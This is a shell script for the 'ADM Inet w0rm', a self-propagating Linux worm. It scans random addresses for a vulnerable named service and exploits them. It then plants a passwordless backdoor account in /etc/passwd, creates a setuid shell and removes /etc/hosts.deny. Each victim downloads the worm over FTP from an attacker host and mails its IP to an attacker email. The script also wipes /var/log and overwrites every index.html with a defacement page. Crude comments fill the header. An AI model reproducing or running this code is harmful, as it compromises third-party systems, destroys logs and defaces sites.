#!/bin/sh
# ADM Inet w0rm 
# Linux X86 spef..  anyway it's my first w0rm :)
# ver 0.1
# i'm not responsable of the usage of diz w0rm !!! 
# greetz: to  all blondes with the short hairs who look's good =), the netg 
# sistah, all of the handrail's i'll slide, all of the sweden chix i'll fuk ;) 
# and The ADM Crew oooooooofffffff course heh
#          LIFE IS A BITCH, BE HARDCORE WITH 'EM, DONT FINISH LIKE ME !
# ********************* THE CREW WILL NEVER DIE ***************************

EMAIL="admsmb@hotmail.com" 
SAY="The ADM Inet w0rm is here !"
PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
export PATH


IP_A=`./gimmeIP`

cat << _EOF_ > cmd
w0rm
/tmp/.w0rm -c "/usr/sbin/named" &
PATH="/bin/:/usr/sbin/:/usr/bin:/sbin:/usr/local/bin:."
export PATH
echo -e "<html> <body>\n$SAY\n <\html> <\\\body>" > /tmp/.X11x
cd /tmp/
mkdir .w0rm0r
cd .w0rm0r
if [ -f /tmp/w0rmishere ]
then
nohup /tmp/.w0rm -c "/bin/sleep 60;/bin/rm -rf /var/log/* /tmp/.w0rm" &
logout
fi
ftp $IP_A
w0rm

cd /tmp/.w0rm0r
get ADMw0rm.tgz
bye
tar xfvz ADMw0rm.tgz
touch /tmp/w0rmishere
nohup ./ADMw0rm &
./gimmeIP | /bin/mail $EMAIL
nohup /tmp/.w0rm -c "/bin/sleep 60;/bin/rm -rf /var/log/* /tmp/.w0rm" &
nohup find / -name "index.html" -exec /bin/cp /tmp/.X11x {} \; &
logout
_EOF_


./gimmeRAND | ./incremental  | ./scanco  | while read VICTIM
do
RESU=`./test $VICTIM 2> /dev/null | awk '{printf("%s",$3)}' 2> /dev/null`

if [ $RESU = "vulnerable." ]
then 

echo "lets hack" 
./Hnamed $VICTIM /bin/sh -c "echo >> /etc/passwd; echo \"w0rm::2666:777:ADM Inet w0rm:/:/bin/sh\" >> /etc/passwd; /bin/cp /bin/sh /tmp/.w0rm; /bin/chmod 4777 /tmp/.w0rm; /bin/rm -f /etc/hosts.deny"             
nohup ./remotecmd $VICTIM cmd 3000000  &
fi
done 
 